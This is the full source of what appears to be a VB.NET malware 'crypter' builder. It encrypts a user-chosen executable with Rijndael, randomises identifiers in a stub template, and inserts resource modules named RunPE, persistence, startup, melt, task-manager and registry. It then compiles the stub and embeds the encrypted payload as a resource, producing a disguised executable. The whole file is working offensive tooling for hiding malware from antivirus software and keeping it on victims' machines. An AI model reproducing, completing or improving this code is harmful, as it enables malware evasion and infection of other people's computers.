﻿Imports System.CodeDom.Compiler
Imports System.IO.File
Imports System.Resources
Imports System.Text
Imports System.Runtime.InteropServices
Imports System.Security.Cryptography
Imports System.IO

Public Class Form1

#Region "Decleration"
    Dim Open1 As New OpenFileDialog
    Dim Open2 As New OpenFileDialog
    Dim Save1 As New SaveFileDialog
    Dim RAN As New Random
#End Region

#Region "Functions and Sub"

    Public Function GenerateRandomString(ByRef Length As String) As String
        Dim AC As String
        GenerateRandomString = Nothing
        AC = "ᡗᡧᡷᡶᡦᡖᡆᠶᠦ᠖᠕ᠥᠵᡅᡕᡥᡵᡴᡔᡄᠴᠤᠣᠳᡃᡓᡣᡳ༐༒༑༠༡༱ཁདཡཱའཐཀ༰གདྷརཱིིལནགྷ༳༣༓骨頂革難…六五四事亊争予与ӨҞώϟωϐϚЀӏӔׅөԁӧҶ" + _
        "ҼҘқҍabcdefghijklmnopqrstuvwxyzあいうえおはひふへほもめみまこけくきかẦḆḈḒḔбукиазъглагольестьдоброземляЖЗЉЊЌФШЏЦz"
        'AC = "1234567890QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm"
        For i As Integer = 1 To Length
            GenerateRandomString += Mid(AC, Int(Rnd() * Len(AC) + 1), 1)
        Next
        Return GenerateRandomString
    End Function

    Public Function GenerateRandomString2(ByRef Length As String) As String
        Dim AC As String
        GenerateRandomString2 = Nothing
        AC = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm"
        For i As Integer = 1 To Length
            GenerateRandomString2 += Mid(AC, Int(Rnd() * Len(AC) + 1), 1)
        Next
        Return GenerateRandomString2
    End Function


    Public Shared Function GenerateRandomint(ByRef length As Integer) As Integer
        Randomize()
        Dim allowableChars As String
        allowableChars = "0123456789"
        GenerateRandomint = 0
        Dim i As Integer
        For i = 1 To length
            GenerateRandomint = GenerateRandomint & Mid$(allowableChars, Int(Rnd() * Len(allowableChars) + 1), 1)
        Next
        Return GenerateRandomint
    End Function

    Public Shared Function RijndaelEncrypt(ByVal bytes As Byte(), ByVal Key As String) As Byte()
        Dim memoryStream As MemoryStream
        Dim cryptoStream As CryptoStream
        Dim rijndael__1 As Rijndael = Rijndael.Create()
        Dim pdb As New Rfc2898DeriveBytes(Key, New Byte() {&H26, &HDC, &HFF, &H0, &HAD, &HED, _
         &H7A, &HEE, &HC5, &HFE, &H7, &HAF, _
         &H4D, &H8, &H22, &H3C})
        rijndael__1.Key = pdb.GetBytes(32)
        rijndael__1.IV = pdb.GetBytes(16)
        memoryStream = New MemoryStream()
        cryptoStream = New CryptoStream(memoryStream, rijndael__1.CreateEncryptor(), CryptoStreamMode.Write)
        cryptoStream.Write(bytes, 0, bytes.Length)
        cryptoStream.Close()
        Return memoryStream.ToArray()
    End Function

    Public Sub Crypt()
        Try
            pbar1.Visible = True : pbar1.Value = 0
            Dim P As New CompilerParameters
            Dim Prov = New Collections.Generic.Dictionary(Of String, String)
            Prov.Add("CompilerVersion", "v2.0")
            P.GenerateExecutable = True
            P.TreatWarningsAsErrors = False
            P.CompilerOptions = "/optimize+ /platform:x86 /t:winexe"
            P.IncludeDebugInformation = False
            pbar1.Value = 10
            If Not Open2.FileName = Nothing Then P.CompilerOptions += " /win32icon:" + Open2.FileName
            With Save1
                .Title = "Select Save Location for Crypted File."
                .Filter = "Executable File (*.exe)|*.exe"
                '.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
            End With
            pbar1.Value = 20
            If Save1.ShowDialog = DialogResult.OK Then
                Dim S As String = My.Resources.Source
                Dim B As Byte()
                Dim EncStr As String = GenerateRandomString2(RAN.Next(15, 25))
                Using FSRead As FileStream = New FileStream(Open1.FileName, FileMode.Open, FileAccess.Read)
                    B = New Byte((FSRead.Length) - 1) {}
                    Dim NumBytestoRead As Integer = CType(FSRead.Length, Integer)
                    Dim NumBytesRead As Integer = 0
                    While (NumBytestoRead > 0)
                        Dim n As Integer = FSRead.Read(B, NumBytesRead, NumBytestoRead)
                        If (n = 0) Then Exit While
                        NumBytesRead += n
                        NumBytestoRead -= n
                    End While
                    NumBytestoRead = B.Length
                End Using

                B = RijndaelEncrypt(B, EncStr)
                S = S.Replace("{KEY}", EncStr)
                S = S.Replace("Rand", GenerateRandomString(20))
                S = S.Replace("#PEE", My.Resources.RunPE)
                pbar1.Value = 15

                pbar1.Value = 40
                S = S.Replace("{DELAY}", My.Resources.RunCMDXpl)
                pbar1.Value = 55
                If chkMelt.Checked Then S = S.Replace("{MELT}", My.Resources.Melt) Else S = S.Replace("{MELT}", "")
                If chkStartup.Checked Then
                    If chkPersis.Checked Then
                        S = S.Replace("{PERSISTANCE}", My.Resources.Persistance)
                        S = S.Replace("{STARTUP}", "")
                    Else
                        S = S.Replace("{PERSISTANCE}", "")
                        S = S.Replace("{STARTUP}", My.Resources.Startup)
                    End If
                Else
                    S = S.Replace("{PERSISTANCE}", "")
                    S = S.Replace("{STARTUP}", "")
                End If
                pbar1.Value = 70
                If chkTaskMgr.Checked Then S = S.Replace("{TASKMGR}", My.Resources.TaskMgr) Else S = S.Replace("{TASKMGR}", "")
                If chkRegistry.Checked Then S = S.Replace("{REGISTRY}", My.Resources.Registry_) Else S = S.Replace("{REGISTRY}", "")
                If chkUSB.Checked Then S = S.Replace("{USB}", "") Else S = S.Replace("{USB}", "")
                pbar1.Value = 80

                S = S.Replace("{KEY}", EncStr)
                'WriteAllText("Source Crypt1.txt", S)
                Dim percentdelims As New List(Of String)
                Dim matchespercentdelims As RegularExpressions.MatchCollection = RegularExpressions.Regex.Matches(S, "%(.*?)%")
                For Each m As RegularExpressions.Match In matchespercentdelims
                    For Each c As RegularExpressions.Capture In m.Captures
                        percentdelims.Add(c.ToString())
                    Next
                Next

                For Each varname As String In percentdelims
                    Dim rnd1 As String = GenerateRandomString2(22)
                    Dim rnd2 As String = GenerateRandomString2(22)
                    S = S.Replace(varname, rnd2)
                Next
                'S = S.Replace("%", "")
                'WriteAllText("Source Crypt1.txt", S)
                pbar1.Value = 90
                P.OutputAssembly = Save1.FileName
                P.ReferencedAssemblies.Add("System.dll")
                P.ReferencedAssemblies.Add("System.Data.dll")
                P.ReferencedAssemblies.Add("System.Windows.Forms.dll")


                pbar1.Value = 95

                Dim R As CompilerResults = New VBCodeProvider(Prov).CompileAssemblyFromSource(P, S)
                If R.Errors.Count > 0 Then
                    Dim Message As String = Nothing
                    For Each Err As CodeDom.Compiler.CompilerError In R.Errors
                        Message += vbNewLine + Err.ToString + vbNewLine
                    Next
                    MsgBox(Message, vbCritical, "Error")
                Else
                    WriteResource(Save1.FileName, B)
                    pbar1.Value = 100
                    txtFile.BackColor = Color.Yellow
                    txtFile.Text = "Your File has been Successfully Crypted!"
                    WriteAllText("Source Crypt.txt", S)
                End If

            End If
            Open1.FileName = Nothing : Open2.FileName = Nothing : Save1.FileName = Nothing
        Catch ex As Exception
            MsgBox("An error occured while crypting your File. Read info. below:" + vbNewLine + vbNewLine + ex.ToString, vbCritical, "Error.")
        End Try

    End Sub
#End Region

    Private Sub btFile_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btFile.Click
        With Open1
            .Title = "Select File to be Crypted."
            .Filter = "Executable Files (*.exe)|*.exe|Any File (*.*)|*.*"
            If .ShowDialog = DialogResult.OK Then
                pbar1.Value = 0 : pbar1.Visible = False
                txtFile.Text = Open1.FileName
                txtFile.BackColor = txtIcon.BackColor
            End If
        End With
    End Sub

    Private Sub txtFile_DoubleClick(ByVal sender As Object, ByVal e As System.EventArgs) Handles txtFile.DoubleClick
        btFile.PerformClick()
    End Sub

    Private Sub btIcon_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btIcon.Click
        With Open2
            .Title = "Select the Icon for your File."
            .Filter = "Icon File (.ico)|*.ico"
            If Open2.ShowDialog = DialogResult.OK Then
                txtIcon.Text = Open2.FileName
                pbIcon.ImageLocation = Open2.FileName
            End If
        End With
    End Sub

    Private Sub txtIcon_DoubleClick(ByVal sender As Object, ByVal e As System.EventArgs) Handles txtIcon.DoubleClick
        btIcon.PerformClick()
    End Sub

    Private Sub chkDelay_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles chkDelay.CheckedChanged
        txtDelay.Text = "" : txtDelay.BackColor = Color.White
        If chkDelay.Checked Then txtDelay.Enabled = True : txtDelay.Focus() Else txtDelay.Enabled = False
    End Sub

    Private Sub txtDelay_Click(ByVal sender As Object, ByVal e As System.EventArgs) Handles txtDelay.Click
        txtDelay.BackColor = Color.White
    End Sub

    Private Sub txtDelay_KeyPress(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyPressEventArgs) Handles txtDelay.KeyPress
        If Asc(e.KeyChar) <> 13 AndAlso Asc(e.KeyChar) <> 8 AndAlso Not IsNumeric(e.KeyChar) Then
            e.Handled = True
        End If
    End Sub

    Private Sub Form1_KeyDown(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles Me.KeyDown
        If e.KeyCode = Keys.F Then btFile.PerformClick()
        If e.KeyCode = Keys.I Then btIcon.PerformClick()
        If e.KeyCode = Keys.D Then If chkDelay.Checked Then chkDelay.Checked = False Else chkDelay.Checked = True
        If e.KeyCode = Keys.P Then
            If chkPersis.Enabled = True Then
                If chkPersis.Checked Then chkPersis.Checked = False Else chkPersis.Checked = True
            End If
        End If
        If e.KeyCode = Keys.S Then If chkStartup.Checked Then chkStartup.Checked = False Else chkStartup.Checked = True
        If e.KeyCode = Keys.M Then If chkMelt.Checked Then chkMelt.Checked = False Else chkMelt.Checked = True
        If e.KeyCode = Keys.T Then If chkTaskMgr.Checked Then chkTaskMgr.Checked = False Else chkTaskMgr.Checked = True
        If e.KeyCode = Keys.R Then If chkRegistry.Checked Then chkRegistry.Checked = False Else chkRegistry.Checked = True
        If e.KeyCode = Keys.U Then If chkUSB.Checked Then chkUSB.Checked = False Else chkUSB.Checked = True
        If e.KeyCode = Keys.G Then btKeyGen.PerformClick()
    End Sub

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        cbEnc.SelectedIndex = 0
        pbar1.Visible = False
        chkPersis.Enabled = False
        txtDelay.Enabled = False
    End Sub

    Private Sub btCrypt_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btCrypt.Click
        If Open1.FileName = Nothing Then
            txtFile.BackColor = Color.Red
            txtFile.Text = "NO FILE SELECTED."
            Exit Sub
        End If

        If chkDelay.Checked Then
            If txtDelay.Text = "" Or txtDelay.Text = "0" Then txtDelay.BackColor = Color.Red : Exit Sub
        End If
        btKeyGen.PerformClick()
        Crypt()
    End Sub

    Private Sub btKeyGen_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btKeyGen.Click
        txtRanKey.Text = GenerateRandomString(RAN.Next(30, 60))
    End Sub

    Private Sub txtRanKey_Click(ByVal sender As Object, ByVal e As System.EventArgs) Handles txtRanKey.Click
        btKeyGen.PerformClick()
    End Sub

    Private Sub chkStartup_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles chkStartup.CheckedChanged
        If chkStartup.Checked Then chkPersis.Enabled = True Else chkPersis.Enabled = False
        chkPersis.Checked = False
    End Sub
End Class

Module ResourceWrite
    Private Function ToPtr(ByVal data As Object) As IntPtr
        Dim h As GCHandle = GCHandle.Alloc(data, GCHandleType.Pinned)
        Dim ptr As IntPtr
        Try
            ptr = h.AddrOfPinnedObject()
        Finally
            h.Free()
        End Try
        Return ptr

    End Function

    <DllImport("kernel32.dll", SetLastError:=True)> _
    Private Function UpdateResource(ByVal hUpdate As IntPtr, ByVal lpType As String, ByVal lpName As String, ByVal wLanguage As UShort, ByVal lpData As IntPtr, ByVal cbData As UInteger) As Boolean
    End Function
    <DllImport("kernel32.dll", SetLastError:=True)> _
    Private Function BeginUpdateResource(ByVal pFileName As String, <MarshalAs(UnmanagedType.Bool)> ByVal bDeleteExistingResources As Boolean) As IntPtr
    End Function
    <DllImport("kernel32.dll", SetLastError:=True)> _
    Private Function EndUpdateResource(ByVal hUpdate As IntPtr, ByVal fDiscard As Boolean) As Boolean
    End Function

    Public Function WriteResource(ByVal filename As String, ByVal bytes As Byte()) As Boolean

        Try
            Dim handle As IntPtr = BeginUpdateResource(filename, False)
            Dim file1 As Byte() = bytes
            Dim fileptr As IntPtr = ToPtr(file1)
            Dim res As Boolean = UpdateResource(handle, "RT_RCDATA", "0", 0, fileptr, Convert.ToUInt32(file1.Length))
            EndUpdateResource(handle, False)
        Catch ex As Exception
            Return False
        End Try
        Return True

    End Function
End Module

